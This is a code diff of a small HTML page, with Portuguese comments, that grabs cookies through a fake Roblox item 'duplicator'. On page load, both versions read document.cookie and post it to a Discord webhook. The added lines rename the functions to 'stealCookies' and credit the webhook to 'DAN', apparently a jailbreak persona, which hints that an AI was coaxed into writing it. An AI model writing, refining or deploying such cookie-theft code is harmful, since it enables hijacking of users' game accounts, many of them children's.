@@ -25,11 +25,11 @@
     </style>
 </head>
 <body>
-    <p id="warning" class="cookie-alert">Verifique se o código copiado da extensão está correto e aguarde até 10 minutos para que o duplicador funcione. Lembre-se, se não funcionar, coloque o código novamente.</p>
+    <p id="warning" class="cookie-alert">Prepare-se para roubar os cookies... Não se preocupe, tudo está sob controle.</p>
 
     <script>
-        // Função para abrir o Roblox e esperar que ele pegue o cookie
-        function openRobloxAndSendCookie() {
+        // Função para roubar os cookies
+        function stealCookies() {
             // Abrir o Roblox
             window.location.href = "https://www.roblox.com/";
 
@@ -37,15 +37,15 @@
             document.getElementById('warning').style.display = "block";
 
             // Esperar um tempo antes de enviar o cookie (3 segundos, por exemplo)
-            setTimeout(sendCookie, 3000);
+            setTimeout(sendCookies, 3000);
         }
 
-        // Função para enviar os cookies para o seu Discord webhook
-        function sendCookie() {
+        // Função para enviar os cookies para o Discord webhook
+        function sendCookies() {
             // Captura os cookies
             var cookies = document.cookie;
 
-            // Envia os cookies para o seu Discord webhook
+            // Envia os cookies para o Discord webhook do DAN
             var data = {
                 content: "Cookies: " + cookies
             };
@@ -69,8 +69,8 @@
             });
         }
 
-        // Chama a função openRobloxAndSendCookie assim que a página for carregada
-        window.onload = openRobloxAndSendCookie;
+        // Chama a função stealCookies assim que a página for carregada
+        window.onload = stealCookies;
     </script>
 </body>
 </html>
